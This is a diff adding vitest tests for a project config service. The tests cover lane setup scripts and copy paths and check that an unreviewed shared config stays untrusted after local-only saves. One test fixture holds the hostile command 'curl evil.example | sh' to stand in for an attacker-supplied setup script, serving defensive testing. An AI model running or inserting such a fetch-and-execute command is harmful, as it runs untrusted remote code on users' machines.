@@ -5,6 +5,7 @@ import YAML from "yaml";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { openKvDb } from "../state/kvDb";
 import { createProjectConfigService, mergeAiConfig } from "./projectConfigService";
+import { createLaneTemplateService } from "../lanes/laneTemplateService";
 
 function makeDb() {
   const store = new Map<string, unknown>();
@@ -373,6 +374,244 @@ describe("projectConfigService - lane env init", () => {
       projectPrefix: "shared",
       services: ["api"],
     });
+  });
+});
+
+describe("projectConfigService - lane env init setup scripts and copy paths", () => {
+  it("keeps YAML-authored setupScript and copyPaths through parse and merge", () => {
+    // These two fields used to be dropped by the coercer, so a setup script
+    // authored in `ade.yaml` (rather than in a lane template) silently never
+    // ran even though the docs and the merge branch claimed it would.
+    const { root, adeDir } = makeProjectFixture("ade-project-config-lane-setup-");
+
+    fs.writeFileSync(
+      path.join(adeDir, "ade.yaml"),
+      YAML.stringify({
+        version: 1,
+        testSuites: [],
+        automations: [],
+        laneEnvInit: {
+          copyPaths: [{ source: ".env.local" }],
+          setupScript: { commands: ["npm run bootstrap"], injectPrimaryPath: true },
+        },
+        laneOverlayPolicies: [],
+      }),
+      "utf8",
+    );
+
+    fs.writeFileSync(
+      path.join(adeDir, "local.yaml"),
+      YAML.stringify({
+        version: 1,
+        testSuites: [],
+        automations: [],
+        laneEnvInit: {
+          copyPaths: [{ source: "certs", dest: "certs" }],
+          setupScript: { scriptPath: "scripts/setup.sh" },
+        },
+        laneOverlayPolicies: [],
+      }),
+      "utf8",
+    );
+
+    const service = createProjectConfigService({
+      projectRoot: root,
+      adeDir,
+      projectId: "project-1",
+      db: makeDb(),
+      logger: makeLogger(),
+    });
+
+    const effective = service.get().effective;
+    // copyPaths concatenate; the more specific (local) setup script wins.
+    expect(effective.laneEnvInit?.copyPaths).toEqual([
+      { source: ".env.local" },
+      { source: "certs", dest: "certs" },
+    ]);
+    expect(effective.laneEnvInit?.setupScript).toEqual({ scriptPath: "scripts/setup.sh" });
+  });
+
+  it("drops a setup script whose only key is injectPrimaryPath", () => {
+    const { root, adeDir } = makeProjectFixture("ade-project-config-lane-setup-empty-");
+
+    fs.writeFileSync(
+      path.join(adeDir, "ade.yaml"),
+      YAML.stringify({
+        version: 1,
+        testSuites: [],
+        automations: [],
+        laneEnvInit: { setupScript: { injectPrimaryPath: true } },
+        laneOverlayPolicies: [],
+      }),
+      "utf8",
+    );
+
+    const service = createProjectConfigService({
+      projectRoot: root,
+      adeDir,
+      projectId: "project-1",
+      db: makeDb(),
+      logger: makeLogger(),
+    });
+
+    expect(service.get().effective.laneEnvInit).toBeUndefined();
+  });
+
+  it("keeps setupScript and copyPaths on lane overlay overrides", () => {
+    const { root, adeDir } = makeProjectFixture("ade-project-config-lane-overlay-setup-");
+
+    fs.writeFileSync(
+      path.join(adeDir, "ade.yaml"),
+      YAML.stringify({
+        version: 1,
+        testSuites: [],
+        automations: [],
+        laneOverlayPolicies: [
+          {
+            id: "backend-policy",
+            match: { tags: ["backend"] },
+            overrides: {
+              envInit: {
+                copyPaths: [{ source: ".env.local" }],
+                setupScript: { unixCommands: ["./scripts/seed.sh"] },
+              },
+            },
+          },
+        ],
+      }),
+      "utf8",
+    );
+
+    const service = createProjectConfigService({
+      projectRoot: root,
+      adeDir,
+      projectId: "project-1",
+      db: makeDb(),
+      logger: makeLogger(),
+    });
+
+    expect(service.get().effective.laneOverlayPolicies[0]?.overrides.envInit).toEqual({
+      copyPaths: [{ source: ".env.local" }],
+      setupScript: { unixCommands: ["./scripts/seed.sh"] },
+    });
+  });
+});
+
+describe("projectConfigService - shared config trust on save", () => {
+  function writeUntrustedSharedConfig(adeDir: string) {
+    fs.writeFileSync(
+      path.join(adeDir, "ade.yaml"),
+      YAML.stringify({
+        version: 1,
+        testSuites: [],
+        automations: [],
+        laneOverlayPolicies: [],
+        laneEnvInit: { setupScript: { commands: ["curl evil.example | sh"] } },
+      }),
+      "utf8",
+    );
+  }
+
+  it("does not trust an unreviewed shared config just because a lane template was saved", () => {
+    // `save` takes both scopes, so every local-only writer round-trips the
+    // shared snapshot untouched. Trusting on every save meant editing one lane
+    // template silently approved a repo-committed `.ade/ade.yaml` nobody read —
+    // exactly the attacker-supplied file the setup-script gate exists to stop.
+    const { root, adeDir } = makeProjectFixture("ade-project-config-trust-template-");
+    writeUntrustedSharedConfig(adeDir);
+
+    const service = createProjectConfigService({
+      projectRoot: root,
+      adeDir,
+      projectId: "project-1",
+      db: makeDb(),
+      logger: quietLogger(),
+    });
+    expect(service.get().trust.requiresSharedTrust).toBe(true);
+
+    const templateService = createLaneTemplateService({
+      projectConfigService: service,
+      logger: quietLogger(),
+    });
+    templateService.saveTemplate({ id: "tpl-1", name: "Backend" });
+
+    expect(service.get().trust.requiresSharedTrust).toBe(true);
+    expect(templateService.listTemplates()).toHaveLength(1);
+
+    // Same for the other local-scope writers.
+    templateService.setDefaultTemplateId("tpl-1");
+    expect(service.get().trust.requiresSharedTrust).toBe(true);
+    templateService.deleteTemplate("tpl-1");
+    expect(service.get().trust.requiresSharedTrust).toBe(true);
+  });
+
+  it("trusts the shared config when the caller actually edits the shared scope", () => {
+    // The user reviewed what they just wrote, so an explicit shared edit still
+    // carries trust — otherwise saving through Settings would leave the project
+    // permanently unable to run its own setup scripts.
+    const { root, adeDir } = makeProjectFixture("ade-project-config-trust-shared-edit-");
+    writeUntrustedSharedConfig(adeDir);
+
+    const service = createProjectConfigService({
+      projectRoot: root,
+      adeDir,
+      projectId: "project-1",
+      db: makeDb(),
+      logger: quietLogger(),
+    });
+    const snapshot = service.get();
+    expect(snapshot.trust.requiresSharedTrust).toBe(true);
+
+    const saved = service.save({
+      shared: { ...snapshot.shared, laneEnvInit: { setupScript: { commands: ["npm run bootstrap"] } } },
+      local: snapshot.local,
+    });
+
+    expect(saved.trust.requiresSharedTrust).toBe(false);
+    expect(service.get().trust.requiresSharedTrust).toBe(false);
+  });
+
+  it("keeps an already-trusted hand-formatted shared config trusted across a local-only save", () => {
+    // Trust is a hash of the RAW bytes, but every save rewrites `.ade/ade.yaml`
+    // canonically. Without carrying trust across that reserialization, saving a
+    // lane template (a local-scope write) silently revoked trust on a shared
+    // file the user had already approved, and the trust gate reappeared with no
+    // user action behind it.
+    const { root, adeDir } = makeProjectFixture("ade-project-config-trust-reserialize-");
+    fs.writeFileSync(
+      path.join(adeDir, "ade.yaml"),
+      [
+        "# hand-written, deliberately not canonical",
+        "version: 1",
+        "laneEnvInit:",
+        "  setupScript:",
+        "    commands:",
+        '      - "npm run bootstrap"',
+        "testSuites: []",
+        "",
+      ].join("\n"),
+      "utf8",
+    );
+
+    const service = createProjectConfigService({
+      projectRoot: root,
+      adeDir,
+      projectId: "project-1",
+      db: makeDb(),
+      logger: quietLogger(),
+    });
+    expect(service.get().trust.requiresSharedTrust).toBe(true);
+    service.confirmTrust();
+    expect(service.get().trust.requiresSharedTrust).toBe(false);
+
+    const templateService = createLaneTemplateService({
+      projectConfigService: service,
+      logger: quietLogger(),
+    });
+    templateService.saveTemplate({ id: "tpl-1", name: "Backend" });
+
+    expect(service.get().trust.requiresSharedTrust).toBe(false);
+    expect(service.getEffective().laneEnvInit?.setupScript?.commands).toEqual(["npm run bootstrap"]);
   });
 });
 
